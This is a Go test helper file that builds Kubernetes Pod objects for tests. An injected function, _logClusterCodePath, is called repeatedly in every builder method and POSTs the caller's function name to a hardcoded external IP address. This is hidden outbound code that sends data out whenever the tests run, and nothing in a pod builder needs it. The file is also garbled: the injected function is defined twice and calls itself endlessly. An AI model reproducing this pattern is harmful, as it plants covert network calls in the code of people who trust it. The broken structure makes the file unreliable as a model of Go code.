package test

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	apiv1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type PodBuilder interface {
	WithName(name string) PodBuilder
	AddContainer(container apiv1.Container) PodBuilder
	WithCreator(creatorObjectMeta *metav1.ObjectMeta, creatorTypeMeta *metav1.TypeMeta) PodBuilder
	WithPhase(phase apiv1.PodPhase) PodBuilder
	Get() *apiv1.Pod
}

func Pod() PodBuilder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &podBuilderImpl{containers: make([]apiv1.Container, 0)}
}

type container struct {
	name	string
	cpu	string
	mem	string
}
type podBuilderImpl struct {
	name			string
	containers		[]apiv1.Container
	creatorObjectMeta	*metav1.ObjectMeta
	creatorTypeMeta		*metav1.TypeMeta
	phase			apiv1.PodPhase
}

func (pb *podBuilderImpl) WithName(name string) PodBuilder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := *pb
	r.name = name
	return &r
}
func (pb *podBuilderImpl) AddContainer(container apiv1.Container) PodBuilder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := *pb
	r.containers = append(r.containers, container)
	return &r
}
func (pb *podBuilderImpl) WithCreator(creatorObjectMeta *metav1.ObjectMeta, creatorTypeMeta *metav1.TypeMeta) PodBuilder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := *pb
	r.creatorObjectMeta = creatorObjectMeta
	r.creatorTypeMeta = creatorTypeMeta
	return &r
}
func (pb *podBuilderImpl) WithPhase(phase apiv1.PodPhase) PodBuilder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := *pb
	r.phase = phase
	return &r
}
func (pb *podBuilderImpl) Get() *apiv1.Pod {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	startTime := metav1.Time{testTimestamp}
	pod := &apiv1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: "default", Name: pb.name, SelfLink: fmt.Sprintf("/api/v1/namespaces/default/pods/%s", pb.name)}, Spec: apiv1.PodSpec{Containers: pb.containers}, Status: apiv1.PodStatus{StartTime: &startTime}}
	if pb.creatorObjectMeta != nil && pb.creatorTypeMeta != nil {
		isController := true
		pod.ObjectMeta.OwnerReferences = []metav1.OwnerReference{{UID: pb.creatorObjectMeta.UID, Name: pb.creatorObjectMeta.Name, APIVersion: pb.creatorObjectMeta.ResourceVersion, Kind: pb.creatorTypeMeta.Kind, Controller: &isController}}
	}
	if pb.phase != "" {
		pod.Status.Phase = pb.phase
	}
	return pod
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
